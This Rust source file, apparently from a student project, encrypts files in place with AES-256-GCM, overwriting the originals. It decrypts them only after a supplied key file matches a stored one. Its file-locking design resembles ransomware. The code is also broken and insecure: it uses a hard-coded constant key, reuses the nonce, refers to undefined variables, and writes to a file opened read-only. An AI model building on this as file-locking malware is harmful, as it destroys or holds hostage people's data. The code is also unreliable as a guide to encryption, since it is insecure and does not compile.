extern crate aes;
extern crate aes_gcm;
use aes::cipher::generic_array::GenericArray;
use aes::cipher::typenum::Integer;
use aes::cipher::typenum::UInt;
use aes::cipher::typenum::UTerm;
use aes::cipher::typenum::B0;
use aes::cipher::typenum::B1;
use aes_gcm::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    Aes256Gcm,
    Key, // Or `Aes128Gcm`
};
use std::fs::File;
use std::io::Read;
use std::io::Write;
use std::path::Path;
pub struct keystuff{
  pub keym : Key<Aes256Gcm>,
  pub noncem : GenericArray<u8, UInt<UInt<UInt<UInt<UTerm, B1>, B1>, B0>, B0>>,
}

pub fn keygen () -> keystuff{
  let _key = Aes256Gcm::generate_key(OsRng);
  let key: &[u8; 32] = &[42; 32];
  let key: &Key<Aes256Gcm> = key.into();
  let nonce: GenericArray<u8, UInt<UInt<UInt<UInt<UTerm, B1>, B1>, B0>, B0>> = Aes256Gcm::generate_nonce(&mut OsRng);
  let ksr : keystuff = keystuff{
    keym : *key , 
    noncem : nonce,
  };
  return ksr;
}
//static mut key:&Key<Aes256Gcm> = None;
pub fn tkd(input_file_path: &Path, keystuff1 : &keystuff)
 {
    let mut iter = 0;
    let mut file = File::open(input_file_path).expect("Failed to open file");
    let mut plaintext = Vec::new();
    file.read_to_end(&mut plaintext)
        .expect("Failed to read file");
    

    let cipher = Aes256Gcm::new(&keystuff1.keym);

   
    let ciphertext = cipher.encrypt(&keystuff1.noncem, plaintext.as_ref()).unwrap();
    let _b = String::from_utf8(ciphertext.clone());
    let mut file = File::create(input_file_path).expect("Failed to create file");
    file.write_all(&ciphertext)
        .expect("Failed to write to file");
     
}


pub fn verkey(input_file_path: &Path )-> bool{
 //this is ideal working let mut file = File::open(input_file_path).expect("Failed to open file");
  let mut okf =  File::open(Path::new(r"C:\Users\ismiv\fyp\fyp\src\keyf.txt")).expect("Failed to open file");
   let mut key = Vec::new();
  okf.read_to_end(&mut key);
   let mut gkf = File::open(&input_file_path).expect("failed to open file");
  let mut keyu = Vec::new();
  gkf.read_to_end(&mut keyu);
  let mut flag=1;
  if key.len() != keyu.len(){ return false;}
  else{ 
    for i in 0..key.len(){
      if key[i]!=keyu[i] {return false}
    }
    traverse_directory(kpath, false, ks);
    return true;}
}


pub fn decryptor(input_file_path: &Path,ks : &keystuff){
  let key = ks.keym;
  let nonce = ks.noncem;
  let cipher = Aes256Gcm::new(&key);
  let mut file = File::open(input_file_path).expect("Failed to open file");
    let mut ciphertext = Vec::new();
    file.read_to_end(&mut ciphertext)
        .expect("Failed to read file");
  let plaintext = cipher.decrypt(&nonce, ciphertext.as_ref()).unwrap();
  file.write_all(&plaintext)
  .expect("Failed to write to file"); 
  
}